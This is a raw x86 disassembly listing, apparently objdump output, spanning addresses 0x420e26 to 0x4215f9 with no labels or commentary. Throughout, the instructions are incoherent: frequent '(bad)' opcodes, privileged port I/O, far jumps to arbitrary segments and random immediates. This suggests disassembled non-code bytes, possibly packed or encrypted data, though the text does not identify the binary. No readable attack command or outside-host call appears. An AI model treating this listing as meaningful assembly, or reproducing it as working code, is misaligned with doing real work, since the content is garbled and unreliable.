  420e26:	xchg   ebx,eax
  420e27:	or     ch,bh
  420e29:	hlt    
  420e2a:	sar    DWORD PTR [edi+0x4f],0x47
  420e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e2f:	xchg   DWORD PTR [esp+ecx*1-0x1c72caae],esp
  420e36:	adc    ebp,esi
  420e38:	neg    DWORD PTR [edi+0x60]
  420e3b:	test   BYTE PTR [edi+0x5ec30212],cl
  420e41:	or     BYTE PTR ds:0x76b84e59,0x13
  420e48:	or     bl,al
  420e4a:	clc    
  420e4b:	sar    BYTE PTR [edx+esi*8+0x484a1804],0xda
  420e53:	fdiv   DWORD PTR [edi]
  420e55:	sub    ebp,esp
  420e57:	pushf  
  420e58:	cmp    dl,BYTE PTR [ebp-0x27]
  420e5b:	out    0x7a,eax
  420e5d:	sbb    DWORD PTR [ecx+0x7af3f36c],eax
  420e63:	int3   
  420e64:	mov    ch,0xe4
  420e67:	out    dx,al
  420e68:	mov    es,WORD PTR cs:[edx+ebx*2+0xe965]
	...
  420e78:	add    BYTE PTR [eax],al
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e18
  420e87:	shl    eax,cl
  420e89:	outs   dx,DWORD PTR ds:[esi]
  420e8a:	clc    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    ah,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    bh,cl
  420e93:	(bad)  
  420e94:	int    0x29
  420e96:	shl    al,cl
  420e98:	dec    ebx
  420e99:	mov    ecx,0x460245dd
  420e9e:	pop    esi
  420e9f:	inc    esp
  420ea0:	push   es
  420ea1:	jo     0x420e5e
  420ea3:	addr16 arpl di,bx
  420ea6:	adc    esi,0xad93d9c0
  420eac:	repnz ins BYTE PTR es:[edi],dx
  420eae:	call   0x94:0xcae26216
  420eb5:	jmp    0x420f2a
  420eb7:	or     ch,dl
  420eb9:	sbb    eax,0x5544a127
  420ebe:	pop    ecx
  420ebf:	jb     0x420f21
  420ec1:	and    al,0xbb
  420ec3:	push   esp
  420ec4:	inc    esi
  420ec5:	mov    ch,0x39
  420ec7:	pop    edx
  420ec8:	leave  
  420ec9:	into   
  420eca:	jl     0x420ebf
  420ecc:	and    al,BYTE PTR [ecx+0x30]
  420ecf:	xlat   BYTE PTR ds:[ebx]
  420ed0:	mov    eax,esp
  420ed2:	mov    ss,WORD PTR [edi+ebx*4-0xa9aa1db]
  420ed9:	mov    al,0x9d
  420edb:	fstp   TBYTE PTR [ecx-0x737fa910]
  420ee1:	cmp    BYTE PTR [eax],ch
  420ee3:	stos   DWORD PTR es:[edi],eax
  420ee4:	xor    eax,0xddc3f86c
  420ee9:	sub    edx,0x89301ec
  420eef:	es cwde 
  420ef1:	hlt    
  420ef2:	retf   0x4c93
  420ef5:	mov    ch,0x95
  420ef7:	sub    esi,esp
  420ef9:	xchg   esp,eax
  420efa:	jno    0x420f6a
  420efc:	fwait
  420efd:	cmp    DWORD PTR [esi+esi*1-0x7dc295c8],ecx
  420f04:	xchg   esi,eax
  420f05:	mov    al,ds:0x8d4ad597
  420f0a:	or     bh,BYTE PTR [ebx]
  420f0c:	imul   ecx,DWORD PTR [ecx-0x6a],0x7d
  420f10:	fldcw  WORD PTR [edi+0xe63f91]
  420f16:	lea    ebp,[ecx+eiz*2]
  420f19:	repz cmp DWORD PTR gs:[eax],eax
  420f1d:	in     eax,dx
  420f1e:	xchg   ah,bh
  420f20:	cwde   
  420f21:	cmp    ch,bh
  420f23:	(bad)  
  420f24:	out    0xed,eax
  420f26:	sbb    esp,ebp
  420f28:	enter  0xaf74,0x57
  420f2c:	dec    ecx
  420f2d:	cmp    eax,0x22bf17ad
  420f32:	adc    DWORD PTR [ebp-0x3a33003f],esp
  420f38:	stos   BYTE PTR es:[edi],al
  420f39:	pop    edx
  420f3a:	call   FWORD PTR [ecx]
  420f3c:	popa   
  420f3d:	les    esp,FWORD PTR es:[edi-0x17]
  420f41:	in     al,0x50
  420f43:	or     eax,0x378fd0c6
  420f48:	mov    cl,0x66
  420f4a:	sub    DWORD PTR [edx+0x75],0xfffffff5
  420f4e:	fcmovnbe st,st(0)
  420f50:	sbb    al,0x9b
  420f52:	int    0xa6
  420f54:	and    BYTE PTR [ecx-0x42],bl
  420f57:	xchg   dl,ch
  420f59:	or     eax,0xc8fde49c
  420f5e:	and    al,0x25
  420f60:	jnp    0x420fbd
  420f62:	fistp  WORD PTR [eax]
  420f64:	xchg   edx,eax
  420f65:	adc    BYTE PTR [edi],0xbf
  420f68:	inc    esp
  420f69:	outs   dx,BYTE PTR ds:[esi]
  420f6a:	rol    DWORD PTR [esi+0x1c9cf038],1
  420f70:	fwait
  420f71:	pop    ebx
  420f72:	inc    ecx
  420f73:	hlt    
  420f74:	cmp    cl,ch
  420f76:	mov    esp,0x1d4f9aec
  420f7b:	pop    edi
  420f7c:	jae    0x420f68
  420f7e:	jae    0x420f47
  420f80:	cmp    BYTE PTR [ecx+ebp*4+0x370db158],al
  420f87:	sbb    al,ch
  420f89:	sub    BYTE PTR [edi-0x11],ch
  420f8c:	in     eax,dx
  420f8d:	lock inc ecx
  420f8f:	pop    esi
  420f90:	dec    ebx
  420f91:	xor    eax,0x330ca860
  420f96:	jecxz  0x420fd0
  420f98:	out    dx,al
  420f99:	dec    eax
  420f9a:	icebp  
  420f9b:	push   es
  420f9c:	je     0x420f6a
  420f9e:	stos   BYTE PTR es:[edi],al
  420f9f:	stc    
  420fa0:	mov    ah,0x67
  420fa2:	xlat   BYTE PTR ds:[ebx]
  420fa3:	lahf   
  420fa4:	pop    esi
  420fa5:	push   ecx
  420fa6:	shl    DWORD PTR [edi+0x237eecaa],1
  420fac:	int3   
  420fad:	pop    ecx
  420fae:	or     DWORD PTR [edi+0x509213cc],ebx
  420fb4:	pop    ds
  420fb5:	sub    BYTE PTR [ebx+0x7f],ch
  420fb8:	test   BYTE PTR [edx+edx*4-0x2f],dh
  420fbc:	pusha  
  420fbd:	(bad)  
  420fbe:	addr16 jmp 0x421024
  420fc1:	lahf   
  420fc2:	icebp  
  420fc3:	repz arpl WORD PTR [eax-0x30],cx
  420fc7:	cmp    dl,ah
  420fc9:	(bad)  
  420fca:	aaa    
  420fcb:	adc    BYTE PTR [ebp+0x0],al
  420fce:	or     al,0x8f
  420fd0:	les    esp,FWORD PTR ds:0xfee91dba
  420fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fd7:	inc    esp
  420fd8:	mov    ds:0x4408dae1,eax
  420fdd:	pop    esi
  420fde:	pop    ecx
  420fdf:	loopne 0x420fe0
  420fe1:	test   eax,0x30c893a5
  420fe6:	and    edi,edx
  420fe8:	aas    
  420fe9:	imul   ebx,ebx,0xffffffad
  420fec:	xor    esi,esi
  420fee:	pusha  
  420fef:	shl    BYTE PTR [edi],1
  420ff1:	hlt    
  420ff2:	adc    eax,0x75635a04
  420ff7:	jmp    FWORD PTR [ecx]
  420ff9:	cmp    eax,0x3d792463
  420ffe:	scas   eax,DWORD PTR es:[edi]
  420fff:	mov    esp,0xbf4f7e0a
  421004:	cmp    esi,esp
  421006:	enter  0x849f,0x38
  42100a:	inc    al
  42100c:	out    dx,al
  42100d:	cs sbb eax,0x18bad434
  421013:	repz or ebx,DWORD PTR [ebp+0x5d04fc93]
  42101a:	or     DWORD PTR [ecx+0x41],esi
  42101d:	clc    
  42101e:	mov    DWORD PTR [eax-0x40],ecx
  421021:	adc    cl,dl
  421023:	mov    ah,0x8f
  421025:	adc    esi,ebx
  421027:	es fwait
  421029:	jmp    0x3a47:0x136800d3
  421030:	dec    esi
  421031:	jp     0x42101e
  421033:	outs   dx,BYTE PTR ds:[esi]
  421034:	add    BYTE PTR [ecx],al
  421036:	dec    esp
  421037:	lods   eax,DWORD PTR ds:[esi]
  421038:	pop    esp
  421039:	add    eax,0x71600f46
  42103e:	jne    0x421061
  421040:	xor    al,0x2
  421042:	pcmpgtd mm5,mm4
  421045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421046:	dec    edx
  421047:	loopne 0x4210aa
  421049:	pop    edx
  42104a:	mov    bh,0x6f
  42104c:	push   es
  42104d:	js     0x420ff1
  42104f:	xor    ah,BYTE PTR [edi-0x2f28817a]
  421055:	sub    ah,ch
  421057:	cmp    cl,BYTE PTR [esi+0x3b]
  42105a:	std    
  42105b:	jno    0x4210db
  42105d:	sbb    bl,dl
  42105f:	sbb    al,0xb
  421061:	fcmovnbe st,st(5)
  421063:	mov    al,ds:0x60a76ddf
  421068:	pusha  
  421069:	test   al,0x4c
  42106b:	mov    ebx,0x38cde14c
  421070:	scas   eax,DWORD PTR es:[edi]
  421071:	push   edx
  421072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421073:	hlt    
  421074:	jnp    0x42104e
  421076:	sahf   
  421077:	sti    
  421078:	add    edi,DWORD PTR es:[edi]
  42107b:	xor    edx,DWORD PTR [ebp-0xa2598a4]
  421081:	imul   ecx,DWORD PTR [eax+0x64],0xffffffab
  421085:	(bad)  
  421086:	mov    edi,0x7800895c
  42108b:	(bad)  [eax-0x18]
	...
  42109a:	pop    esp
  42109b:	mov    dh,BYTE PTR [edi-0x23800895]
  4210a1:	mov    edi,0x2b60ebfc
  4210a6:	mov    edx,0xf4f96c32
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    ah,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [edx+0x32],bh
  4210b4:	fs xchg edx,eax
  4210b6:	dec    edx
  4210b7:	iret   
  4210b8:	push   0x2964d19d
  4210bd:	out    0x9f,eax
  4210bf:	xlat   BYTE PTR ds:[ebx]
  4210c0:	cld    
  4210c1:	adc    BYTE PTR [edx-0x61f87aa3],bl
  4210c7:	xchg   DWORD PTR [ecx-0x39],ecx
  4210ca:	adc    ebp,esp
  4210cc:	pop    ecx
  4210cd:	inc    edi
  4210ce:	dec    ebx
  4210cf:	mov    ah,0xcc
  4210d1:	adc    ecx,DWORD PTR [ebx+0x4e]
  4210d4:	enter  0xd5ab,0x3c
  4210d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210d9:	std    
  4210da:	cmp    al,0xd7
  4210dc:	ja     0x4210fe
  4210de:	mov    WORD PTR [ecx],gs
  4210e0:	sub    eax,0x1a1bd631
  4210e5:	sub    cl,dl
  4210e7:	jmp    0x6dc006e7
  4210ec:	cld    
  4210ed:	lahf   
  4210ee:	sbb    esp,DWORD PTR [eax+0xb81d74e]
  4210f4:	lods   al,BYTE PTR ds:[esi]
  4210f5:	ss mov esp,0x4caf490e
  4210fb:	xchg   edi,eax
  4210fc:	daa    
  4210fd:	pop    edi
  4210fe:	test   al,0x1b
  421100:	push   edx
  421101:	loope  0x421148
  421103:	pop    esi
  421104:	inc    ebp
  421105:	xor    ecx,DWORD PTR [esi+0x54]
  421108:	(bad)  
  421109:	aad    0xef
  42110b:	je     0x4210f5
  42110d:	and    BYTE PTR [ecx+eax*8+0x3e],al
  421111:	mov    al,ds:0x8308db87
  421116:	inc    eax
  421117:	jle    0x421159
  421119:	daa    
  42111a:	jg     0x421160
  42111c:	ss xchg edi,eax
  42111e:	push   0x79
  421120:	sbb    BYTE PTR [ebx+eiz*1+0x1],ah
  421124:	aas    
  421125:	test   al,0xd1
  421127:	cld    
  421128:	pop    ecx
  421129:	mov    ebp,0x8741c944
  42112e:	imul   edi,edi,0xffffffc2
  421131:	mov    ds:0xbce027a2,eax
  421136:	(bad)  
  421137:	pop    ds
  421138:	(bad)  
  421139:	mov    al,ds:0xdcc79119
  42113e:	xchg   esp,esi
  421140:	loope  0x421108
  421142:	enter  0xd382,0xa1
  421146:	lock pusha 
  421148:	adc    DWORD PTR ds:0x419803a4,esi
  42114e:	popf   
  42114f:	xchg   esp,eax
  421150:	or     al,0x3b
  421152:	nop
  421153:	pop    esp
  421154:	add    BYTE PTR [edx+edx*4+0x1ae81d5e],bl
  42115b:	mov    bh,0xee
  42115d:	cmp    dl,BYTE PTR [ebx]
  42115f:	test   eax,0x72d38116
  421164:	mov    eax,ds:0xedef20b6
  421169:	dec    ecx
  42116a:	repnz fs xacquire lock xchg BYTE PTR cs:[eax-0x280e354e],cl
  421175:	push   ebp
  421176:	loope  0x4211a8
  421178:	pushf  
  421179:	jae    0x421175
  42117b:	sub    ecx,DWORD PTR [esi+eiz*2]
  42117e:	bound  edx,QWORD PTR [ebx-0x2c1f814b]
  421184:	sbb    DWORD PTR [eax+0x518ac3c3],edi
  42118a:	jo     0x421176
  42118c:	mov    edx,0x7538572b
  421191:	(bad)  
  421192:	mov    bl,0x21
  421194:	repnz retf 0x94b8
  421198:	ffree  st(4)
  42119a:	lods   al,BYTE PTR ds:[esi]
  42119b:	xor    al,0x87
  42119d:	inc    esp
  42119e:	fucomip st,st(5)
  4211a0:	scas   eax,DWORD PTR es:[edi]
  4211a1:	mov    DWORD PTR [edi+0x5468cea5],edi
  4211a7:	sti    
  4211a8:	push   ebx
  4211a9:	popa   
  4211aa:	(bad)  [ebp-0x4c]
  4211ad:	push   cs
  4211ae:	je     0x4211c0
  4211b0:	adc    eax,0x23d44070
  4211b5:	ficomp DWORD PTR [ebp+0x3ff33240]
  4211bb:	(bad)  
  4211bc:	(bad)  
  4211bd:	xor    BYTE PTR [esi],bh
  4211bf:	aad    0x67
  4211c1:	and    dh,0x26
  4211c4:	icebp  
  4211c5:	mov    eax,ds:0xd2135653
  4211ca:	in     al,0x32
  4211cc:	shl    cl,0x2f
  4211cf:	in     al,0x53
  4211d1:	inc    edx
  4211d2:	mov    ds:0xdf000cbf,al
  4211d7:	test   eax,0x41369a93
  4211dc:	jge    0x4211ef
  4211de:	fucom  st(2)
  4211e0:	shl    DWORD PTR [ebx+0x1c],0xcc
  4211e4:	(bad)  
  4211e5:	aad    0xff
  4211e7:	(bad)  
  4211e9:	cdq    
  4211ea:	out    dx,al
  4211eb:	dec    eax
  4211ec:	mov    dl,0xc6
  4211ee:	xchg   ecx,eax
  4211ef:	sbb    ah,cl
  4211f1:	sar    DWORD PTR [ebp-0x4f1f0fc0],cl
  4211f7:	fwait
  4211f8:	(bad)  
  4211f9:	fucomip st,st(1)
  4211fb:	lea    edx,[ebp+ecx*4+0x74]
  4211ff:	sbb    BYTE PTR [edx],ah
  421201:	je     0x4211c3
  421203:	test   DWORD PTR [eax+0xa],eax
  421206:	adc    eax,0xd7970e21
  42120b:	(bad)  
  42120c:	mov    bl,0x6f
  42120e:	xchg   esp,eax
  42120f:	cmp    eax,0x96a4c891
  421214:	cmc    
  421215:	push   edx
  421216:	jne    0x4211e4
  421218:	and    al,0xde
  42121a:	mov    eax,ds:0xa88c38e
  42121f:	idiv   DWORD PTR [eax]
  421221:	call   0x6c55:0x4d560fb5
  421228:	xchg   BYTE PTR [eax],dh
  42122a:	fistp  DWORD PTR [ebp+0x5]
  42122d:	sar    al,cl
  42122f:	lods   al,BYTE PTR ds:[esi]
  421230:	je     0x4212a8
  421232:	push   ss
  421233:	popa   
  421234:	mov    al,0xf3
  421236:	clc    
  421237:	popf   
  421238:	adc    edi,DWORD PTR [edx-0x53f72a85]
  42123e:	jecxz  0x4211ed
  421240:	lock and edi,DWORD PTR [edx]
  421243:	and    eax,0x8452c734
  421248:	out    dx,eax
  421249:	fbstp  TBYTE PTR [esi+0x78]
  42124c:	in     al,0x3d
  42124e:	or     DWORD PTR [edx+esi*8-0x6a],ecx
  421252:	loop   0x4211dd
  421254:	cmp    bh,BYTE PTR [eax-0x2e]
  421257:	mov    eax,ds:0x7b150817
  42125c:	int3   
  42125d:	out    dx,eax
  42125e:	outs   dx,BYTE PTR ds:[esi]
  42125f:	fist   WORD PTR [esp+esi*1]
  421262:	outs   dx,BYTE PTR ds:[esi]
  421263:	into   
  421264:	ins    BYTE PTR es:[edi],dx
  421265:	push   DWORD PTR [edx]
  421267:	inc    esp
  421268:	in     al,0xb1
  42126a:	bound  ecx,QWORD PTR [ecx-0x6e]
  42126d:	repnz sbb al,0x27
  421270:	fadd   QWORD PTR [esi-0x1a35ec43]
  421276:	jbe    0x421281
  421278:	(bad)  
  421279:	ds lahf 
  42127b:	sbb    al,0x74
  42127e:	mov    DWORD PTR [eax+0x3cb8a998],esp
  421284:	(bad)  
  421285:	cmp    DWORD PTR [ecx+0x588cf25c],ebp
  42128b:	cmc    
  42128c:	mov    ebp,0x957292c0
  421291:	pop    edx
  421292:	jmp    0x421311
  421294:	mov    es,WORD PTR [esi]
  421296:	out    dx,eax
  421297:	dec    esi
  421298:	pop    esi
  421299:	mov    edx,0x92b8b66a
  42129e:	btr    DWORD PTR [edx-0x74],ebx
  4212a2:	and    BYTE PTR [ecx],al
  4212a4:	cli    
  4212a5:	repnz xchg esp,eax
  4212a7:	fadd   DWORD PTR [eax]
  4212a9:	ret    
  4212aa:	cmc    
  4212ab:	mov    dl,BYTE PTR [ecx]
  4212ad:	jae    0x4212af
	...
  4212b7:	add    BYTE PTR [eax],al
  4212b9:	add    BYTE PTR [edi-0x402578e6],ah
  4212bf:	(bad)  
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx-0x65ff32dd]
  4212ca:	lock mov es,WORD PTR [ecx]
  4212cd:	add    ah,bh
  4212cf:	add    DWORD PTR [eax],eax
  4212d1:	add    ah,bh
  4212d3:	cmp    eax,DWORD PTR [esp+ebp*8+0x20]
  4212d7:	into   
  4212d8:	pusha  
  4212d9:	xor    ecx,edx
  4212db:	xor    al,ah
  4212dd:	sub    eax,DWORD PTR [ebp+0x3370bfb9]
  4212e3:	jp     0x4212ba
  4212e5:	in     eax,dx
  4212e6:	(bad)  
  4212e7:	fistp  DWORD PTR [ebp+0x42]
  4212ea:	jbe    0x4212f7
  4212ec:	and    BYTE PTR [edi+0x18],bl
  4212ef:	sbb    al,0x66
  4212f1:	sbb    al,0xb8
  4212f3:	scas   al,BYTE PTR es:[edi]
  4212f4:	pop    ebx
  4212f5:	mov    cl,0x83
  4212f7:	push   ebx
  4212f8:	pop    ss
  4212f9:	inc    eax
  4212fa:	push   cs
  4212fb:	add    dh,BYTE PTR [esi]
  4212fd:	add    eax,0xe3788ef
  421302:	mov    al,0xa1
  421304:	pop    ds
  421305:	fs pop ebx
  421307:	popf   
  421308:	add    esp,DWORD PTR [ebx]
  42130a:	mov    ds:0xa84ec476,al
  42130f:	mov    dh,BYTE PTR [eax+0x9]
  421312:	push   ds
  421313:	add    ah,BYTE PTR [ebx+0x2518cd7d]
  421319:	mov    ?,WORD PTR [ecx]
  42131b:	pop    edx
  42131c:	jle    0x4212c2
  42131e:	stos   BYTE PTR es:[edi],al
  42131f:	stos   DWORD PTR es:[edi],eax
  421320:	enter  0x9b2c,0x3
  421324:	arpl   WORD PTR [ebp+0x56909607],di
  42132a:	pop    esp
  42132b:	pop    es
  42132c:	shl    al,1
  42132e:	cs pop ds
  421330:	jb     0x42134a
  421332:	arpl   WORD PTR [eiz*8+0x1d6f0942],bp
  421339:	adc    esp,ecx
  42133b:	jnp    0x421377
  42133d:	cmc    
  42133e:	imul   edx,DWORD PTR [ebp+0x4f67061],0x7f
  421345:	cmp    BYTE PTR [edx],0x1d
  421348:	outs   dx,BYTE PTR ds:[esi]
  421349:	add    esp,DWORD PTR [ebx-0x5d]
  42134c:	mov    ebp,0xd28f15ca
  421351:	rcr    DWORD PTR [ecx],1
  421353:	aaa    
  421354:	(bad)  [ecx-0x17]
  421357:	pushf  
  421358:	pop    eax
  421359:	pop    ebp
  42135a:	popa   
  42135b:	mov    dl,0x32
  42135d:	sti    
  42135e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42135f:	and    DWORD PTR [ecx+ebx*8+0x1e],edx
  421363:	push   esi
  421364:	xor    ah,cl
  421366:	sbb    bl,BYTE PTR [eax]
  421368:	ficom  WORD PTR [esi+0x31897d41]
  42136e:	mov    cl,0xe8
  421370:	ret    
  421371:	jnp    0x421339
  421373:	dec    esp
  421374:	data16 sbb ch,BYTE PTR [ebx+ecx*1]
  421378:	add    bl,BYTE PTR [esi+esi*2+0x662d87bc]
  42137f:	xchg   ebp,eax
  421380:	mov    BYTE PTR [ecx],dh
  421382:	sub    al,0xcf
  421384:	add    BYTE PTR [ecx],dh
  421386:	xlat   BYTE PTR ds:[ebx]
  421387:	fsub   QWORD PTR [eax+eax*8-0x15]
  42138b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42138c:	lahf   
  42138d:	mov    esp,0x8abe1a93
  421392:	and    BYTE PTR [ebp+eiz*1-0x164ce2e6],0xeb
  42139a:	cli    
  42139b:	jmp    0x421359
  42139d:	add    al,0x49
  42139f:	or     ebx,DWORD PTR [edx-0x6a]
  4213a2:	daa    
  4213a3:	popf   
  4213a4:	inc    ecx
  4213a5:	add    DWORD PTR [ecx+0x2b],edi
  4213a8:	push   ebp
  4213a9:	stos   BYTE PTR es:[edi],al
  4213aa:	jne    0x4213de
  4213ac:	fcomip st,st(6)
  4213ae:	gs nop
  4213b0:	inc    ebp
  4213b1:	and    eax,0x89519266
  4213b6:	xchg   dl,bl
  4213b8:	js     0x4213bc
  4213ba:	stc    
  4213bb:	jecxz  0x42134a
  4213bd:	pushf  
  4213be:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4213c0:	xchg   edx,eax
  4213c1:	push   ebp
  4213c2:	pusha  
  4213c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213c4:	fisub  DWORD PTR [edx+0x21]
  4213c7:	push   eax
  4213c8:	mov    eax,0x7455ec98
  4213cd:	xor    bh,BYTE PTR [ebx]
  4213cf:	mov    dh,0x14
  4213d1:	sar    DWORD PTR [edi],0x90
  4213d4:	or     DWORD PTR [ecx+0x7a],ecx
  4213d7:	mov    eax,0x19c747c6
  4213dc:	stos   BYTE PTR es:[edi],al
  4213dd:	ficomp DWORD PTR [ecx+0x4915757d]
  4213e3:	mov    ebp,0x99b2b267
  4213e8:	fiadd  WORD PTR [ebx]
  4213ea:	jge    0x421442
  4213ec:	test   al,0x6d
  4213ee:	data16 data16 ins BYTE PTR es:[edi],dx
  4213f1:	adc    al,0x4a
  4213f3:	ja     0x42140b
  4213f5:	and    eax,0x993dec63
  4213fa:	or     esp,DWORD PTR [edi+ecx*2]
  4213fd:	rcl    DWORD PTR [eax+0x4d3513ef],0xd7
  421404:	mov    ebx,0xff05727c
  421409:	dec    ebx
  42140a:	(bad)  
  42140b:	mov    ?,WORD PTR [edi]
  42140d:	cmp    ecx,DWORD PTR [esi]
  42140f:	pop    edi
  421410:	jae    0x42148d
  421412:	sub    esp,DWORD PTR [edi+0x4bc4f2e2]
  421418:	mov    BYTE PTR [esi],bh
  42141a:	dec    edi
  42141b:	cs aas 
  42141d:	in     al,0x52
  42141f:	and    BYTE PTR ds:0x4e234d4e,ah
  421425:	inc    esp
  421426:	es dec esi
  421428:	data16 or bh,BYTE PTR [eax-0x54781d67]
  42142f:	or     eax,DWORD PTR [edx]
  421431:	xchg   ebx,eax
  421432:	(bad)  
  421433:	jmp    0xbba11726
  421438:	cmc    
  421439:	aad    0xc8
  42143b:	fbstp  TBYTE PTR [ebp-0x58]
  42143e:	mov    BYTE PTR gs:[edi-0x751057e0],bl
  421445:	cld    
  421446:	rcr    DWORD PTR [ebp-0x1c025162],cl
  42144c:	call   FWORD PTR [edi+0x3f6becdc]
  421452:	or     esi,DWORD PTR [ebx-0x70f957f8]
  421458:	mov    ebp,0x8686c27e
  42145d:	push   ss
  42145e:	das    
  42145f:	jp     0x421411
  421461:	into   
  421462:	adc    esi,esi
  421464:	js     0x4214c7
  421466:	push   edx
  421467:	lea    edi,[edx]
  421469:	gs and al,0xc6
  42146c:	int3   
  42146d:	in     al,0xc5
  42146f:	enter  0x77ce,0x84
  421473:	pusha  
  421474:	in     eax,dx
  421475:	enter  0x8a9d,0x20
  421479:	xor    al,0x9d
  42147b:	stc    
  42147c:	scas   al,BYTE PTR es:[edi]
  42147d:	cdq    
  42147e:	dec    edx
  42147f:	retf   0x175b
  421482:	mov    esp,0x2e06e835
  421487:	ins    BYTE PTR es:[edi],dx
  421488:	or     al,0xa6
  42148a:	int    0x8a
  42148c:	(bad)  
  42148d:	fs je  0x4214b6
  421490:	int3   
  421491:	pusha  
  421492:	nop
  421493:	add    al,0x96
  421495:	push   edx
  421496:	cmp    esp,ecx
  421498:	mov    eax,ds:0xc93cd97d
  42149d:	cmp    eax,0xc1668125
  4214a2:	pop    edx
  4214a3:	das    
  4214a4:	ja     0x4214a2
  4214a6:	stc    
  4214a7:	sar    DWORD PTR [esi-0x2c],cl
  4214aa:	mov    es,WORD PTR [eax-0x76]
  4214ad:	mov    dl,0x11
  4214af:	lods   al,BYTE PTR ds:[esi]
  4214b0:	mov    eax,ds:0xdffedb08
  4214b5:	and    eax,0x2a3ad41
  4214ba:	stc    
  4214bb:	ja     0x4214c8
  4214bd:	add    ebp,eax
  4214bf:	add    ebx,DWORD PTR [eax]
  4214c1:	mov    edi,0x88598400
  4214c6:	shl    BYTE PTR [edi+0x9],1
  4214c9:	je     0x4214da
  4214cb:	push   esi
  4214cc:	inc    esp
  4214cd:	xlat   BYTE PTR ds:[ebx]
	...
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	ror    BYTE PTR [edx+0x58],cl
  4214e9:	shr    ah,1
  4214eb:	nop
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	cld    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [ebx],ah
  4214f3:	inc    ebp
  4214f4:	das    
  4214f5:	mov    ch,BYTE PTR [ecx-0x2a304936]
  4214fb:	xor    BYTE PTR fs:[edx],0x83
  4214ff:	mov    ds:0xcccd22fc,al
  421504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421505:	stc    
  421506:	jne    0x4214fe
  421508:	cmp    BYTE PTR [ebx],0xdd
  42150b:	mov    esp,DWORD PTR [esi+ebx*4]
  42150e:	aad    0xde
  421510:	out    0xff,eax
  421512:	mov    ss,WORD PTR [esi+0x258ece63]
  421518:	leave  
  421519:	stos   BYTE PTR es:[edi],al
  42151a:	push   ebx
  42151b:	(bad)  
  42151c:	sti    
  42151d:	addr16 mov esp,0x6c8cdb41
  421523:	ficomp WORD PTR [ebp-0x10c51704]
  421529:	xor    DWORD PTR [edx],edx
  42152b:	pop    ecx
  42152d:	and    DWORD PTR [ebp+0x4c],eax
  421530:	fwait
  421531:	pop    ds
  421532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421533:	xchg   esi,eax
  421534:	add    ebx,eax
  421536:	ins    BYTE PTR es:[edi],dx
  421537:	and    eax,0xeb6affef
  42153c:	jp     0x421551
  42153e:	and    DWORD PTR [ecx-0x3c],0xffffffef
  421542:	mov    ss,eax
  421544:	(bad)  
  421546:	retf   0x2665
  421549:	cmp    DWORD PTR [ebx-0x80],edx
  42154c:	jo     0x4215cc
  42154e:	xlat   BYTE PTR ds:[ebx]
  42154f:	adc    esi,0xf
  421552:	inc    DWORD PTR [edx+0x1b6fe5be]
  421558:	inc    ebx
  421559:	cld    
  42155a:	jmp    0x421580
  42155c:	mov    dl,0x86
  42155e:	lahf   
  42155f:	mov    al,ds:0x3938dae9
  421564:	addr16 xchg esi,eax
  421566:	outs   dx,BYTE PTR ds:[esi]
  421567:	ror    DWORD PTR [esi-0x6537610d],1
  42156d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42156e:	and    ecx,DWORD PTR [eax]
  421570:	mov    ah,0x9f
  421572:	into   
  421573:	adc    eax,0xc3b01d4b
  421578:	xchg   esp,edi
  42157a:	mov    ebx,0x3ce68e5b
  42157f:	and    DWORD PTR [esi+0x25901ba4],0x4b6d330f
  421589:	add    dh,BYTE PTR [ebx+0x6f931144]
  42158f:	pusha  
  421590:	shr    DWORD PTR [edx],1
  421592:	loop   0x4215b4
  421594:	xchg   esp,eax
  421595:	mov    al,ds:0xea496742
  42159a:	mov    al,0x11
  42159c:	sub    BYTE PTR ds:0xf696d389,ah
  4215a2:	add    ecx,ebx
  4215a4:	ins    BYTE PTR es:[edi],dx
  4215a5:	pusha  
  4215a6:	cmp    bl,dh
  4215a8:	in     al,0x72
  4215aa:	mov    dh,0x81
  4215ac:	mov    esi,0xb15e504d
  4215b1:	pop    edx
  4215b2:	ret    0x8d10
  4215b5:	fwait
  4215b6:	outs   dx,DWORD PTR ds:[esi]
  4215b7:	js     0x4215f0
  4215b9:	js     0x4215bb
  4215bb:	ins    DWORD PTR es:[edi],dx
  4215bc:	xchg   BYTE PTR [ebx],bh
  4215be:	or     eax,0x7abb5c1c
  4215c3:	gs pop es
  4215c5:	xchg   BYTE PTR [ebp+0x2d2d45e1],bh
  4215cb:	repnz sbb DWORD PTR [edi+0x17],eax
  4215cf:	sbb    BYTE PTR [ebx-0x180f6c60],bl
  4215d5:	test   DWORD PTR [esi-0x5d0641f2],ebp
  4215db:	in     eax,dx
  4215dc:	std    
  4215dd:	out    dx,al
  4215de:	ins    DWORD PTR es:[edi],dx
  4215df:	mov    esp,0xc8742c65
  4215e4:	and    BYTE PTR [eax],cl
  4215e6:	pop    ebx
  4215e7:	leave  
  4215e8:	add    BYTE PTR [esi-0x487539aa],bl
  4215ee:	push   ecx
  4215ef:	sub    al,0xe6
  4215f1:	and    ebp,ebx
  4215f3:	test   eax,0x81bba107
  4215f8:	lahf   
  4215f9:	popa   
